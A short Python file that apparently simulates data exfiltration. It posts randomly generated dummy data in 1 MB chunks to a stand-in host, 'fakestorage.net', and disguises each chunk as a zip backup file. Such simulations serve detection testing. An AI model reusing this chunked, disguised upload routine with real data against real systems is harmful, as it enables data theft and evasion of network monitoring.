import requests
import os
import random
from datetime import datetime

class Exfiltration:
    def __init__(self, size_mb=5):
        self.size_mb = size_mb
        self.endpoint = "http://data-backup-cloud.fakestorage.net/upload"

    def run(self, targets: list) -> dict:
        r = {'start_time': datetime.now().isoformat(), 'targets': {}}
        for ip in targets:
            dummy = os.urandom(self.size_mb * 1024 * 1024)
            chunks = []
            for i in range(0, len(dummy), 1024*1024):
                chunk = dummy[i:i+1024*1024]
                try:
                    resp = requests.post(
                        self.endpoint,
                        data=chunk,
                        headers={
                            'Content-Type':'application/zip',
                            'X-File-Name':f'backup_{random.randint(1000,9999)}.zip'
                        },
                        timeout=10
                    )
                    chunks.append({'chunk':i//(1024*1024)+1,'status':resp.status_code})
                except Exception as e:
                    chunks.append({'chunk':i//(1024*1024)+1,'error':str(e)[:50]})
            r['targets'][ip] = {
                'total_mb':self.size_mb,
                'chunks':len(chunks),
                'data_type':'RANDOM_DUMMY',
                'dest':self.endpoint
            }
        r['end_time'] = datetime.now().isoformat()
        return r
